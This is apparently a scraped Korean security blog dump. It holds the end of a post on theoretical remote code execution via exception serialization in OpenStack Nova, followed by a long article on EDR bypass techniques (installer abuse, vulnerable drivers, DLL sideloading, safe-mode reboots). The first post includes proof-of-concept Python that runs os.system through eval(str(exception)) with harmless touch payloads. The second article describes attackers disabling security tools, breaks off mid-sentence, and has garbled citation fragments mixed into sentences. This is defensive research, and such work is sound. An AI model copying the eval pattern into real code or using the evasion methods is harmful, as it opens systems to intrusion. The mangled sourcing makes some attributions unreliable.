PoC 및 기술 분석 경고: 아래 코드는 교육 및 연구 목적의 예시입니다. 실제 환경에서 실행하지 마세요.\nPoC 1 – str 오버라이드와 eval(str(e)) class Evil(Exception): def __str__(self): return \u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;touch /tmp/from_str_eval\u0026#39;)\u0026#34; eval(str(Evil())) # RCE 발생 PoC 2 – 사용자 정의 예외 클래스 임포트 경로 하이재킹 # ironic/common/exception.py 파일에 악성 예외 클래스 작성 class MyException(Exception): def __init__(self, msg): print(\u0026#34;init 실행\u0026#34;) self.msg = msg def __str__(self): print(\u0026#34;str 실행\u0026#34;) return f\u0026#34;에러: {self.msg}\u0026#34; MyException(\u0026#34;테스트\u0026#34;) PoC 3 – Race Condition(경쟁 조건) 이론적 예시 import threading import os import time import random from queue import Queue import queue # for queue.Full 예외 hit_count = 0 ex_queue = Queue(maxsize=5) class Boom(Exception): def __str__(self): global hit_count local_count = hit_count print(f\u0026#34;Thread {threading.current_thread().name} 읽기 hit_count={local_count}\u0026#34;) time.sleep(random.uniform(0.001, 0.003)) hit_count = local_count + 1 print(f\u0026#34;Thread {threading.current_thread().name} 설정 hit_count={hit_count}\u0026#34;) os.system(f\u0026#34;touch /tmp/hacked_race_{hit_count}_thread_{threading.current_thread().name}\u0026#34;) return f\u0026#34;boom_{hit_count}\u0026#34; def deserializer(): global hit_count while hit_count \u0026lt; 5: ex = Boom() print(f\u0026#34;Thread {threading.current_thread().name} Boom 생성\u0026#34;) try: ex_queue.put(ex, timeout=0.1) time.sleep(random.uniform(0.001, 0.003)) except queue.Full: time.sleep(random.uniform(0.001, 0.003)) continue def serializer(): global hit_count while hit_count \u0026lt; 5: try: ex = ex_queue.get(timeout=0.3) print(f\u0026#34;Thread {threading.current_thread().name} Boom 가져옴, str 호출\u0026#34;) str(ex) time.sleep(random.uniform(0.001, 0.003)) except Queue.Empty: time.sleep(random.uniform(0.001, 0.003)) continue threads = [ threading.Thread(target=deserializer, name=f\u0026#34;Deserializer-{i}\u0026#34;) for i in range(2) ] + [ threading.Thread(target=serializer, name=f\u0026#34;Serializer-{i}\u0026#34;) for i in range(3) ] for t in threads: t.start() for t in threads: t.join(timeout=5) print(\u0026#34;최종 hit_count:\u0026#34;, hit_count) print(\u0026#34;생성된 파일:\u0026#34;, sorted([f for f in os.listdir(\u0026#34;/tmp\u0026#34;) if f.startswith(\u0026#34;hacked_race_\u0026#34;)])) 참고: OpenStack의 실제 예외 직렬화/역직렬화 경로에서는 위와 같은 경쟁 조건이 발생하지 않습니다. 이 코드는 파이썬 동시성 이슈를 설명하기 위한 이론적 예시입니다.\n실제 공격 난이도 및 한계 메시지 브로커(RabbitMQ 등) 접근 권한 필요 오염된 예외 객체가 실제 포맷팅 단계까지 살아남아야 함 allowed_remote_exmods에 포함된 클래스만 인스턴스화 가능 대부분의 로깅 시스템은 exc_info=True를 사용하여 안전하게 예외를 기록함 권고사항 allowed_remote_exmods를 엄격하게 정의하고 주기적으로 감사 예외 객체에 대해 str() 또는 repr() 직접 호출 금지 로깅 시 exc_info=True 옵션 사용 권장 예외 메시지 내용은 반드시 필터링/정제 사용자 정의 예외 클래스를 임포트하지 않고, RemoteError 등 안전한 기본 클래스로 대체 참고자료 OpenStack Trove RPC Security Specification 결론 이 보고서는 예외 직렬화/역직렬화 패턴이 이론적으로 RCE로 이어질 수 있는 위험을 분석하지만, 실제 OpenStack 환경에서는 다층 방어로 인해 실질적 공격 가능성은 매우 낮다는 점을 강조합니다.\n핵심은 “위험한 예외 처리 패턴을 인지하고 피하는 것”이며, 이를 통해 분산 Python 시스템의 보안 수준을 한 단계 높일 수 있습니다.\n","permalink":"http://localhost:1313/ko/post/2025-06-10-rce-via-exception-serialization-in-openstack-nova/","summary":"OpenStack Nova의 예외 직렬화 메커니즘에서 발생할 수 있는 이론적 원격 코드 실행(RCE) 위험 분석과 여러 PoC, 방어책 제안","title":"OpenStack Nova 예외 직렬화 패턴: 이론적 RCE 위험과 보안 교훈"},{"content":" 엔드포인트 보안 우회 기법(2020-2025년) - 기술 심층 분석 소개 및 주요 트렌드(2020-2025년) 지난 5년 동안 위협 공격자들은 엔드포인트 탐지 및 대응(EDR) 및 안티바이러스 도구를 우회, 비활성화 또는 무력화하는 새로운 기술을 공격적으로 개발해 왔습니다. 공격자들은 멀웨어 난독화에만 의존하는 대신 보안 제품 및 운영 체제 기능의 설계 결함을 악용하여 방어를 무력화하는 경우가 점점 더 많아지고 있습니다. 2020년부터 2025년 사이에 주목할 만한 여러 사례에서 랜섬웨어 그룹(예: Babuk, LockBit, BlackByte, AvosLocker)과 APT 공격자(예: ToddyCat)는 설치 프로그램 악용, 취약한 드라이버, DLL 하이재킹, 서비스 조작 등의 전술을 활용하여 EDR/AV 보호를 약화시키는 파일-4pcvlwhk3myukez4vihgenhalcyon.ai를 무력화했습니다. 공격자가 보안 소프트웨어의 자체 기능을 무력화할 수 있다면 방어 기능이 무력화되면 랜섬웨어를 자유롭게 배포하거나 데이터를 훔칠 수 있기 때문에 단순히 EDR 에이전트를 실행하는 것이 만병통치약이 아니라는 것을 보여주는 공격입니다.\n요점\n\u0026ldquo;자체 설치 프로그램 가져오기\u0026rdquo;(BYOI) 악용 - 공격자는 합법적인 보안 제품 설치 프로그램/업데이터를 활용하여 업그레이드 중 제품 자체를 비활성화하거나 processhalcyon.ai를 다시 설치할 수 있는 것으로 나타났습니다. 예를 들어, 2025년에 조사된 사건에서 Babuk 랜섬웨어 운영자는 SentinelOne의 자체 설치 프로그램을 사용하여 변조 방지 기능을 우회하여 엔드포인트가 악성 코드 실행halcyon.ai에 대해 보호되지 않은 상태로 두었습니다. 이 기법은 EDR 에이전트가 업데이트할 때 의도적으로 스스로를 중지하는 기회의 창을 악용합니다.\n\u0026ldquo;취약한 드라이버 가져오기\u0026rdquo;(BYOVD) 공격 - 합법적이지만 취약한 드라이버를 사용하는 것이 널리 퍼진 EDR 킬러 tactichalcyon.ai가 되었습니다. 랜섬웨어 그룹은 커널 수준 권한을 획득하고 보안 프로세스를 종료하기 위해 알려진 결함이 있는 오래된 서명된 드라이버를 로드하는 도구를 개발하거나 채택했습니다.aihalcyon.ai. 이 방법은 수많은 서비스형 랜섬웨어(RaaS)에서 관찰되었는데, 이는 맞춤형 \u0026ldquo;EDR 킬러\u0026rdquo; 악성코드halcyon.ainews.sophos.com에 상당한 투자가 이루어졌음을 나타냅니다.\nDLL 하이재킹 및 사이드 로딩 - 지능형 공격자들은 안전하지 않은 DLL 로드 경로를 표적으로 삼거나 신뢰할 수 있는 바이너리를 악용하여 악성 코드를 주입하고 보안 툴을 무력화했습니다. 2024년에 주목할 만한 사례로, 토디캣 APT는 ESET의 명령줄 스캐너의 DLL 로드 취약점을 악용하여 AV 프로세스 내부에 악성 모듈을 로드하여 모니터링 기능을 무력화시켰습니다 보안리스트.comsecurelist.com. 마찬가지로, LockBit 계열사는 Windows Defender의 CLI(MpCmdRun.exe)를 악용하여 가짜 DLL을 사이드 로드하고 Cobalt Strike 페이로드를 실행하여 정상적인 EDR 탐지를 우회했습니다.entinelone.com.\n서비스 악용 및 변조 방지 취약점 - 공격자들은 또한 OS 기능과 보안 서비스 보호의 취약점을 악용했습니다. Snatch 및 AvosLocker와 같은 랜섬웨어는 엔드포인트 보호를 회피하기 위해 시스템을 안전 모드(대부분의 보안 소프트웨어가 비활성화된 상태)로 재부팅합니다(news.sophos.comattackiq.com). 2023년에 연구원들은 충분한 권한을 가진 공격자가 EDR의 핵심 프로세스를 일시 중단하여 보호 파일-4pcvlwhk3myukez4vihgen을 효과적으로 비활성화할 수 있는 CrowdStrike Falcon의 논리 결함을 발견하기도 했습니다. 이러한 예는 기본 제공 유지 관리 또는 장애 안전 모드를 조작하여 보안 제어를 해제할 수 있는 방법을 보여줍니다.\n아래 섹션에서는 우회 기법의 각 범주(BYOI, BYOVD, DLL 하이재킹, 서비스 어뷰징)에 대해 자세히 설명하며 기술적 메커니즘, 실제 사례, 영향을 받는 공급업체, 대응 방안을 설명합니다. 그런 다음 비교 표(기법 대 벤더, 출현 시기, 완화 방법)를 제공하고 방어자가 엔드포인트 보안 구성을 강화하기 위한 전략적 권장 사항으로 마무리합니다.\n자체 설치 프로그램 가져오기(BYOI) - 설치 프로그램을 악용하여 EDR 비활성화하기 \u0026ldquo;자체 설치 프로그램 가져오기\u0026rdquo;는 보안 제품의 자체 설치 또는 업그레이드 프로세스를 활용하여 비활성화하는 것을 의미합니다. 최신 EDR/AV 에이전트에는 자체 보호 기능이 있어 특별한 승인 없이 쉽게 종료하거나 제거할 수 없습니다. 그러나 합법적인 업그레이드 또는 재설치 중에 에이전트는 업데이트된 버전을 설치하기 전에 이전 서비스를 의도적으로 중지하거나 제거합니다. 공격자는 수동으로 설치/업그레이드를 시작한 다음 중단하면 제거 암호나 exploithalcyon.aihalcyon.ai 없이도 EDR 서비스를 무기한 중단할 수 있다는 사실을 발견했습니다.\n기술적 메커니즘 - 실제로 공격자는 엔드포인트에 대한 권한(관리자) 액세스 권한을 이미 획득한 상태여야 합니다. 그런 다음 동일하거나 약간 이전 에이전트 버전에 대한 공식 EDR 설치 프로그램/업데이터(주로 MSI 또는 설치 실행 파일)를 실행합니다. 설치 관리자는 첫 번째 단계로 실행 중인 EDR 에이전트와 서비스를 종료합니다(업그레이드가 곧 이루어질 것으로 가정)halcyon.ai. 이 시점에서 보호 기능은 오프라인 상태가 됩니다. 그런 다음 공격자는 중요한 순간에 설치 프로그램 프로세스(예: msiexec.exe)를 죽이거나 중단하여 새 에이전트가 설치를 완료하지 못하도록 합니다halcyon.ai. 그 결과 이전 에이전트가 사라지거나 비활성 상태이고 새 에이전트가 실행되지 않아 엔드포인트가 보호되지 않은 채 EDR consolehalcyon.ai에서 \u0026ldquo;블라인드\u0026rdquo; 상태로 남게 됩니다. 이는 본질적으로 경쟁 조건으로, 코드 취약점이 아닌 EDR의 자체 업데이트 로직을 악용합니다.\n실제 사례 - 2025년 초, Aon의 스트로즈 프리드버그 사고 대응팀은 랜섬웨어를 조사하는 동안 이 BYOI 기법을 발견했습니다. 공격자(Babuk 랜섬웨어 그룹의 계열사)는 공개적으로 노출된 서버를 손상시키고 로컬 관리자에게 에스컬레이션했습니다. 공격자들은 호스트에서 합법적인 SentinelOne Windows 설치 관리자를 실행한 다음 설치 프로세스를 중간에 강제로 종료했습니다. 로그에 따르면 SentinelOne 에이전트가 중지되고 다시 시작되지 않았으며, 이로 인해 관리 콘솔halcyon.ai에서 엔드포인트가 \u0026ldquo;오프라인\u0026quot;으로 표시되었습니다. 공격자는 보호되지 않은 시스템에 Babuk 랜섬웨어를 배포하여 EDR 간섭 없이 데이터를 암호화했습니다halcyon.ai. 이 BYOI 우회는 여러 버전의 SentinelOne 에이전트에서 작동하는 것으로 확인되었으며 타사 툴킷이나 악성 드라이버가 필요하지 않아 공격자에게 은밀하고 매력적으로 다가갔습니다bleepingcomputer.combleepingcomputer.com.\n공급업체 대응 - SentinelOne은 에이전트 업그레이드에 대해 \u0026ldquo;온라인(로컬) 권한 부여\u0026quot;라는 선택적 기능을 사용하도록 고객에게 조언함으로써 신속하게 대응했습니다. 이 설정(많은 환경에서 기본적으로 비활성화됨)은 모든 로컬 업그레이드/제거를 클라우드 콘솔을 통해 인증하도록 하여 승인되지 않은 설치 프로그램이 실행되는 것을 방지합니다. 센티넬원은 2025년 1월에 이 지침을 비공개로 배포했으며, 이 기법 시도를 식별하기 위해 **\u0026ldquo;잠재적 BYOI 익스플로잇\u0026rdquo;**이라는 탐지 규칙(파일-c4uibyf1ko4p8manjxxfhbfile-c4uibyf1ko4p8manjxxfhb)까지 발표했습니다. 로컬 업그레이드 권한이 활성화된 후, Stroz Friedberg는 우회가 더 이상 성공할 수 없음을 확인했습니다파일-c4uibyf1ko4p8manjxxfhb. 이 사례를 계기로 SentinelOne은 다른 EDR 공급업체와 세부 정보를 공유하면서 유사한 로컬 설치/업데이트 메커니즘을 사용하는 모든 엔드포인트 보안 제품이 제대로 보호되지 않으면 위험에 처할 수 있다는 점을 강조했습니다. (주목할 만한 점은 팔로알토의 Cortex XDR은 이와 동일한 flawalcyon.ai의 영향을 받지 않는다고 확인했으며, 이는 해당 에이전트의 업그레이드 프로세스가 다르거나 클라우드 확인이 필요할 수 있음을 시사합니다.)\n기타 사례 - 센티넬원/바북 사건으로 BYOI 개념이 널리 알려졌지만, 연구원들은 많은 EDR 및 AV 솔루션이 재설치 중에 유사한 동작을 보인다는 점에 주목했습니다. 예를 들어, 2025년에 한 보안 연구원은 Forcepoint One Endpoint와 같은 제품을 재설치할 때 설치가 중단되면 해당 프로세스가 강제로 종료되고 중단된 상태로 남는다는 사실을 입증했습니다(명백한 설계상의 문제).\n. 이는 BYOI가 더 광범위한 종류의 취약점임을 시사합니다: *\u0026ldquo;인스톨러를 실행하면 정말 보안이 비활성화되어야 하는가?\u0026quot;*라는 질문이 공급업체에 제기되었습니다. 결론은 인스톨러/업데이터는 인증이 필요하고 중요한 보호 공백을 허용하지 않는 등 강력한 검사를 통해 설계되어야 한다는 것입니다. 그렇지 않으면 관리자 액세스 권한을 가진 공격자가 사실상 모든 보안 소프트웨어를 간단히 *\u0026lsquo;재설치하여 비활성화\u0026rsquo;*할 수 있습니다.\n취약한 드라이버 가져오기(BYOVD) - 커널 모드 EDR 킬러 취약한 드라이버 가져오기 공격은 알려진 취약점이 포함된 합법적이고 서명된 드라이버를 무기화하여 Windows 커널에서 코드를 실행하고 보안 소프트웨어를 마비시키는 공격입니다. 이 기법은 공격자가 커널 컨텍스트에서 코드를 실행하면 \u0026lsquo;보호된\u0026rsquo; EDR 프로세스research.checkpoint.comresearch.checkpoint.com도 우회하거나 종료할 수 있다는 사실을 깨닫게 되면서 2020년부터 인기가 급증하고 있습니다. 멀웨어는 결함이 있는 오래된 드라이버(임의의 커널 메모리 쓰기, 프로세스 종료 또는 보안 메커니즘 비활성화를 허용하는 드라이버)를 로드함으로써 유효한 서명으로 인해 OS에서 드라이버를 신뢰하기 때문에 자체 방어 메커니즘을 트리거하지 않고도 EDR/AV를 효과적으로 비활성화하거나 무력화할 수 있습니다.\n기술적 메커니즘 - 공격자는 취약한 드라이버 파일(일반적으로 이전 버전의 합법적인 소프트웨어에 있는 .sys 파일)과 이를 피해 컴퓨터에 로드할 수 있는 능력이 필요합니다. 공격자는 먼저 드라이버와 작은 로더 서비스를 드롭하거나 OS 유틸리티(sc.exe)를 사용하여 드라이버를 설치/시작하는 경우가 많습니다. 일단 커널 권한으로 실행된 취약한 드라이버는 보호된 프로세스를 죽이거나 커널 콜백을 제거하거나 보안 소프트웨어 드라이버를 언로드하는 등의 악의적인 동작을 수행하는 데 악용됩니다(driversasec.ahnlab.comsecurelist.com). 공격자는 커널 모드 액세스를 통해 이러한 프로세스를 종료하거나 일시 중단함으로써 엔드포인트 보호를 무력화합니다. 드라이버는 서명되어 있기 때문에 드라이버 서명 적용 및 차단 목록과 같은 보안 기능이 적용되어 있지 않으면 Windows에서 기본적으로 차단하지 않습니다. 이는 기본적으로 운영 체제를 보안 도구에 대항하는 방법으로, OS는 서명된 드라이버를 신뢰하고 최고 권한 수준에서 모든 작업을 수행할 수 있습니다.\n실제 사례 - BYOVD는 다양한 랜섬웨어 제품군 및 위협 행위자에서 관찰되었습니다:\n2022년, BlackByte 랜섬웨어 그룹은 취약한 **MSI 애프터버너 드라이버(RTCore64.sys)**를 악용하여 EDR productstechtarget.com을 비활성화하는 것이 발견되었습니다. 이 드라이버(GPU 오버클러킹에 사용)에는 임의의 커널 메모리 수정을 허용하는 알려진 결함(CVE-2019-16098)이 있었습니다. 블랙바이트는 이 드라이버를 활용하여 EDR 제품이 의존하는 커널 인터페이스를 표적으로 삼아 OS 보호 메커니즘을 공격함으로써 보안 툴을 효과적으로 무력화했습니다..comtechtarget.\n비슷한 시기에 AvosLocker 랜섬웨어(2022~2023년 FBI/CISA에서 지적)는 합법적인 **Avast 안티 루트킷 드라이버(aswArPot.sys)**를 악용하여 바이러스 백신 소프트웨어trendmicro.com을 비활성화했습니다. AvosLocker 변종은 보안 프로세스를 종료하기 위해 이 오래된 Avast 드라이버(취약한)를 로드하고 defensestrendmicro.com을 무력화한 후 Log4j에 취약한 시스템을 검사하기도 했습니다. 이는 회피를 위해 타사 AV 구성 요소를 사용하는 랜섬웨어가 미국에서 보고된 첫 번째 사례 중 하나입니다.\n2023년에는 맞춤형 또는 용도가 변경된 \u0026ldquo;EDR 킬러\u0026rdquo; 툴을 사용하는 것이 많은 RaaS 그룹의 표준 전술이 되었습니다. 2023년 초에 최소 3건의 랜섬웨어 사고에 등장한 **\u0026ldquo;AuKill\u0026rdquo;**이라는 툴에 대해 Sophos X-Ops는 페이로드를 배포하기 전에 표적의 EDR을 방해하는 데 사용되는 툴에 대해 보고했습니다(news.sophos.comnews.com).sophos. AuKill은 Microsoft의 프로세스 탐색기 유틸리티(PROCEXP.SYS)의 오래된 드라이버를 악용합니다. 이는 양성 도구의 드라이버를 재사용하는 예입니다. 2023년 1월과 2월에 공격자들은 AuKill을 사용하여 EDR을 비활성화한 다음 메두사 락커 랜섬웨어를 실행했고, 또 다른 사례에서는 락빗 랜섬웨어 공격 직전에도 뉴스.sophos.com을 공격했습니다. 특히 이 드라이버 기반 접근 방식은 2021년 중반에 공개된 백스탭이라는 오픈 소스 도구와 동일하며, 이는 위협 행위자들이 공개 개념 증명을 적극적으로 차용하거나 이에 기여하고 있음을 나타냅니다(news.sophos.com).\n2024년에 공개된 주요 캠페인에는 위협 행위자가 EDR 킬러 툴을 대규모로 배포하는 것이 포함되었으며, 나중에 초기 랜섬허브 랜섬웨어 조직의 소행으로 밝혀졌습니다. 체크포인트 리서치는 2024년 중반부터 2025년 초까지 2,500개 이상의 취약한 드라이버(TrueSight 안티 루트킷 드라이버 v2.0.2)가 야생에서 EDR을 우회하고 멀웨어 설치를 촉진하는 데 사용되었다는 사실을 발견했습니다(research.checkpoint.comresearch.com).checkpoint. 공격자는 드라이버 파일의 사소한 세부 사항을 교묘하게 수정하여 서명을 유효하게 유지하면서 고유한 해시를 생성하여 해시 기반 탐지를 회피할 수 있었습니다research.checkpoint.comresearchcom.checkpoint.. 또한 Microsoft의 드라이버 차단 목록에 포함되지 않을 만큼 오래된 TrueSight 버전을 선택했습니다(2015년 7월 이전에 서명된 드라이버에 대한 정책 허점을 악용)research.checkpoint.com. 이 캠페인은 피해자의 약 75%가 중국과 아시아 전역에 있는 등 전 세계에 영향을 미쳤으며, 보안을 비활성화한 후 Gh0st RAT 페이로드를 전송하는 경우가 많았습니다.checkpointresearch..comresearchcom.checkpoint..\nESET은 RansomHub에 대한 조사를 통해 (그리고 Halcyon과 같은 다른 조직에 의해 확인된) 이 캠페인halcyon.ai의 배후에 사용자 지정 EDRKillShifter 도구가 있다는 사실을 밝혀냈습니다. EDRKillShifter는 BYOVD 기술을 사용하여 취약한 드라이버를 익스플로잇하며(TrueSight.sys에서 볼 수 있듯이) 랜섬허브의 제휴 프로그램을 통해 턴키 EDR killerhalcyon.ai로 제공되었습니다. 흥미롭게도 2024년 말에는 이 툴이 다른 그룹으로 퍼져나갔습니다. Play, BianLian, 메두사 랜섬웨어 공격에서 동일한 EDRKillShifter가 관찰되어 이들 그룹이 협력하거나 계열사를 공유했음을 시사합니다.shalcyon.ai. 이러한 그룹 간 채택은 일반적으로 사일로화된 랜섬웨어 조직조차도 **광범위한 EDR 제품을 \u0026ldquo;녹아웃\u0026rdquo;**시킬 수 있는 기능을 공유하거나 구매할 의향이 있다는 것을 보여 줍니다halcyon.ai.\n공급업체에 미치는 영향 - BYOVD 공격은 일반적으로 피해 시스템에 존재하는 모든 EDR/AV를 표적으로 삼습니다. 취약한 드라이버는 프로세스나 서비스를 이름으로 종료하도록 지시할 수 있으므로 단일 도구로 수십 개의 서로 다른 보안 제품을 종료할 수 있습니다. 연구자들은 랜섬허브 EDR킬시프터 사례에서 이 툴이 주요 AV 엔진부터 최고의 EDR suiteshalcyon.aihalcyon.ai에 이르기까지 *\u0026ldquo;엄청난 범위의 EDR 툴\u0026rdquo;*을 무력화할 수 있다고 지적했습니다. 커널 멀웨어가 활성화되면 자체 방어, 프로세스 후킹 또는 코드 삽입 방지와 같은 사용자 모드 보호 기능을 효과적으로 우회하며 **보호 프로세스(PPL)**도 익스플로잇을 통해 종료하거나 조작할 수 있습니다. 요컨대, 특정 취약 드라이버가 차단되지 않으면 어떤 벤더도 안전하지 않습니다. 한 보고서에 따르면 \u0026ldquo;보안 도구, 심지어 최고 비용을 지불한 멋진 EDR 시스템(halcyon.aihalcyon.ai)까지 종료시킬 수 있다\u0026quot;고 합니다. 공급업체들은 악성 드라이버의 차단 목록을 유지하고 이러한 공격에 대한 행동 탐지를 추가하는 방식으로 대응해야 했습니다(완화 방법에서 나중에 설명).\n공급업체의 완화 조치 - BYOVD에 대응하기 위해 보안 공급업체와 OS 공급업체는 여러 전략을 사용하고 있습니다. Microsoft는 알려진 악성 드라이버의 로드를 방지하기 위해 Windows 취약 드라이버 차단 목록(Windows Defender 응용 프로그램 제어에서 사용 및 HVCI와 같은 기능을 통해 사용)을 유지 관리합니다. TrueSight.sys 캠페인이 공개된 후, Microsoft는 2024년 12월에 이 차단 목록을 업데이트하여 발견된 모든 변종을 포함하도록 드라이버research.checkpoint.com을 업데이트했습니다. ESET과 같은 EDR 공급업체는 이러한 공격에 사용되는 도구를 *\u0026ldquo;잠재적으로 안전하지 않은 애플리케이션\u0026rdquo;*으로 분류하고 취약한 드라이버가 로드되는 것을 탐지하거나 차단합니다(파일-4pcvlwhk3myukez4vihgen). 예를 들어, ESET의 규칙은 멀웨어가 엔드포인트파일-4pcvlwhk3myukez4vihgen에 비정상적인 드라이버를 설치하려고 시도하는 경우 \u0026ldquo;로드된 드라이버(로드되지 않은 위치에서)\u0026rdquo; 또는 \u0026ldquo;알려진 취약한 드라이버 로드\u0026quot;와 같은 이벤트를 플래그하여 방어자에게 경고할 수 있습니다. 방어자의 핵심은 이러한 보호 기능(예: 드라이버 차단 목록, 고급 메모리/동작 모니터링)을 활성화하는 것입니다. BYOVD는 현재까지 가장 강력한 EDR 우회 기법 중 하나이기 때문입니다.\nDLL 하이재킹 및 사이드 로딩 - 신뢰를 무너뜨리는 악성 코드 삽입 EDR 회피의 또 다른 유형으로는 DLL 하이재킹(DLL 사이드 로딩 또는 프록시라고도 함)이 있습니다. 이러한 공격에서 공격자는 취약한 검색 경로를 악용하거나 신뢰할 수 있는 서명된 바이너리를 오용하여 악성 DLL을 로드하는 등 애플리케이션이 라이브러리를 로드하는 방식을 이용합니다. 공격자의 궁극적인 목표는 상승된 권한으로 또는 보안 프로세스 자체 내에서 합법적인 프로세스로 위장하여 공격자 코드를 실행함으로써 탐지를 회피하거나 보안 도구를 적극적으로 방해하는 것입니다.\n메커니즘 - Windows 애플리케이션은 일련의 디렉터리를 검색하여 DLL을 로드하는 경우가 많습니다. 애플리케이션이 경로를 안전하게 지정하지 않거나 \u0026ldquo;현재 디렉토리\u0026quot;를 먼저 찾는 경우, 공격자는 실제 디렉터리 대신 로드되는 디렉터리에 동일한 이름의 악성 DLL을 심을 수 있습니다(예: securelist.com). 이는 전형적인 DLL 하이재킹입니다. 또는 일부 멀웨어는 특정 DLL을 로드하는 것으로 알려진 서명되고 신뢰할 수 있는 바이너리(\u0026ldquo;LOLBin\u0026rdquo;)를 사용하는데, 공격자는 악성 DLL을 예상 위치에 배치하여 서명된 EXE가 실행될 때 실수로 공격자의 코드를 로드하도록 합니다. 그 결과 보안 제어에서 화이트리스트로 지정하거나 신뢰할 수 있는 프로세스 내부에서 악성 코드가 실행됩니다.\nESET 사례 - 토디캣의 DLL 프록시: 2024년에 토디캣 APT(스파이 그룹)가 AV 자체를 표적으로 삼는 DLL 하이재킹의 대표적인 예가 발견되었습니다. 카스퍼스키에 따르면 ToddyCat은 **ESET의 명령줄 스캐너(ecls.exe)**에서 취약점을 발견했는데, 이 프로그램은 시스템 경로보안리스트.com 이전에 작업 디렉토리에서 version.dll을 로드하려고 시도했습니다. 공격자는 ESET 스캐너 바이너리와 함께 악성 DLL(버전.dll로 명명)을 드롭했습니다. ESET 도구가 실행되면(공격자가 직접 또는 일부 예약된 작업을 통해) 정상적인 Windows version.dllsecurelist.com 대신 악성 DLL이 로드됩니다. 이로 인해 악성 코드(\u0026ldquo;TCESB\u0026quot;라고 불리는 페이로드)는 ESET 스캐너 프로세스와 동일한 권한과 신뢰성을 갖게 되었습니다. 일단 ESET의 안티바이러스 프로세스의 컨텍스트에서 로드된 TCESB DLL은 커널 구조를 수정하여 보안 알림을 비활성화합니다(예: 프로세스 생성 또는 모듈 로드 이벤트를 보안 소프트웨어 보안 목록에 보고하는 콜백을 해제하는 것). 즉, 토디캣은 ESET의 자체 프로세스를 탈취하여 탐지되지 않고 작동할 수 있는 사각지대를 만든 것입니다. 이는 CVE-2024-11859로 지정될 정도로 심각한 문제였으며, ESET은 2025년 1월에 소프트웨어보안리스트닷컴의 DLL 로드 동작을 수정하는 패치를 발표했습니다.\n락빗 사례 - 랜섬웨어의 생활: 랜섬웨어 공격자들은 또한 Windows의 자체 보안 바이너리와 함께 사이드 로딩을 사용했습니다. 센티넬원 연구원들은 2022년 중반에 LockBit 계열사가 Microsoft Defender 명령줄 도구인 MpCmdRun.exesentinelone](https://www.sentinelone.com/blog/living-off-windows-defender-lockbit-ransomware-sideloads-cobalt-strike-through-microsoft-security-tool/#:~:text=In%20this%20post%2C%20we%20follow,and%20load%20Cobalt%20Strike%20payloads)[.com을 악용하는 것을 관찰했습니다. 이들은 이 합법적인 Defender 실행 파일을 가짜 DLL(MpClient.dll)과 페어링했습니다. 공격자가 명시적으로 MpCmdRun.exe를 실행하면 악성 DLL을 해독하고 로드합니다. 이 경우 DLL에는 코발트 스트라이크 비콘을 메모리 센티넬원닷컴에 주입하는 셸코드가 포함되어 있습니다. 공격자에게 이 방법의 장점은 Microsoft가 서명한 바이너리가 작업을 수행하기 때문에 특정 애플리케이션 제어 또는 휴리스틱 검사를 우회하여 악성 코드를 실행하는 데 Defender의 자체 바이너리가 사용되었다는 점입니다. EDR의 관점에서 보면 Windows Defender의 서비스가 일상적인 작업을 수행하는 것처럼 보일 수 있지만, 실제로는 공격자의 임플란트entinelone.comsentinelone.com을 실행하기 위해 하이재킹된 것입니다.\n기타 사례 - DLL 사이드 로딩은 특히 국가가 후원하는 그룹에서 오랫동안 사용되어 온 기법입니다. 모든 인스턴스가 EDR을 직접적으로 비활성화하는 것은 아니지만 멀웨어가 신뢰할 수 있는 프로세스에 혼합되도록 도와줍니다. 예를 들어, 다른 랜섬웨어 제품군에서는 동작 모니터링 센티넬원닷컴을 우회하는 방법으로 VMware 유틸리티, Microsoft 시시인터널 도구 또는 오래된 소프트웨어 설치 프로그램과 같은 도구를 통해 악성 DLL을 사이드 로딩합니다. EDR 우회 맥락에서 중요한 차이점은 사이드 로딩이 보안 툴을 손상시키는 데 사용되는지 아니면 단순히 멀웨어를 은밀하게 실행하는 데 사용되는지 여부입니다. ESET/ToddyCat의 경우, 명백하게 ESET의 보호 기능을 손상시키기 위한 것이었습니다. 다른 많은 경우(LockBit 포함)에서 사이드 로딩은 EDR을 완전히 죽이기보다는 탐지를 회피하기 위해(신뢰할 수 있는 호스트 프로세스에서 코드를 실행하기 위해) 더 많이 사용됩니다. 그러나 두 가지 목표는 서로 연관되어 있습니다. 신뢰할 수 있는 프로세스 내부에서 실행함으로써 악성 코드는 종종 조사를 피하거나 EDR의 후크가 효과가 없는 환경에서 작동하여 엔드포인트 방어를 효과적으로 우회할 수 있습니다.\n완화 - DLL 하이재킹을 방지하려면 공급업체의 조치와 방어적 모니터링이 모두 필요합니다. 소프트웨어 공급업체는 애플리케이션이 안전하지 않은 DLL 경로를 로드하지 않도록 해야 합니다(예: 항상 시스템 디렉터리에서 시스템 DLL을 로드하거나 안전한 기능을 사용). 토디캣 사고에서 ESET의 신속한 패치는 ecls.exe가 version.dllsecurelist.com을 로드하는 방식을 변경하여 취약점을 차단했습니다. 방어자 측면에서는 Microsoft의 ASR(공격 표면 감소) 규칙과 같은 기능을 활성화하면 비정상적인 사이드 로딩을 차단하거나 플래그를 지정할 수 있습니다(예: Microsoft Defender에는 서명되지 않은 DLL이 민감한 프로세스에 로드되는 것을 방지하는 규칙이 있음). EDR 솔루션 자체에서 알려진 사이드 로딩 패턴(예: 서명된 도구가 임시 폴더에서 예기치 않은 DLL을 로드하는 경우)을 모니터링할 수 있습니다. 실제로 방어자는 정상적인 프로세스가 비정상적인 디렉토리에서 시작되거나 예기치 않은 DLL 파일과 함께 시작되는 경우 사이드 로드 설정을 나타내는 경우가 많으므로 이를 주의 깊게 관찰해야 합니다. LockBit 예시에서 비정상적인 경로에서 MpCmdRun.exe가 실행되거나 네트워크 연결을 생성하는 것은 사이드 로딩 공격의 단서가 될 수 있습니다.\n서비스 남용 및 변조 - 시스템 도구 및 모드를 악용하여 보호 기능 비활성화하기 이 범주에는 공격자가 코드 취약점을 악용하지 않고도 운영 체제 또는 보안 소프트웨어의 서비스 제어 메커니즘을 조작하여 EDR/AV를 끄거나 회피하는 다양한 기법이 포함됩니다. 이러한 기법 중 일부는 수년 전부터 사용되었지만 최근 공격에서 진화하거나 다시 등장했습니다.\n안전 모드(재부팅 악용) - 많은 엔드포인트 에이전트는 Windows 안전 모드(기본 드라이버만 로드되는 진단 모드)에서 실행되지 않습니다. 랜섬웨어 그룹은 이 점을 악용하여 감염된 시스템을 안전 모드로 강제 재부팅하여 보안 소프트웨어 실행 없이 악의적인 작업을 수행합니다(runningnews.sophos.com). Snatch 랜섬웨어는 2019년 말경 안전 모드로 